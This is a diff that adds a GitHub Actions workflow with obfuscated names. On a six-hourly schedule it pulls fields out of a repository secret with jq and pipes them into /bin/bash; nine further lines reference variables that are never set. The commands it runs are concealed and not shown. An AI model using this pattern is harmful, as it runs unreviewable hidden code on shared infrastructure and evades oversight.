@@ -1,0 +1,28 @@
+name: caozhang19870101
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caozhang19870101
+        env:
+          sibb96: ${{ secrets.sibb96 }}
+        run: |
+          echo $sibb96 | jq -r .kjgw8474 | /bin/bash
+          echo $eaq2688 | jq -r .mb1 | /bin/bash
+          echo $sj64651 | jq -r .sfpj30635 | /bin/bash
+          echo $ejv60 | jq -r .vsbvo72 | /bin/bash
+          echo $xzegx6 | jq -r .rdb433 | /bin/bash
+          echo $gfjtx9658 | jq -r .lwn51818 | /bin/bash
+          echo $dcu8 | jq -r .qkqxb269 | /bin/bash
+          echo $z98 | jq -r .qx355 | /bin/bash
+          echo $dzlej28779 | jq -r .uvd7441 | /bin/bash
+          echo $m8615 | jq -r .hjyz8966 | /bin/bash
+
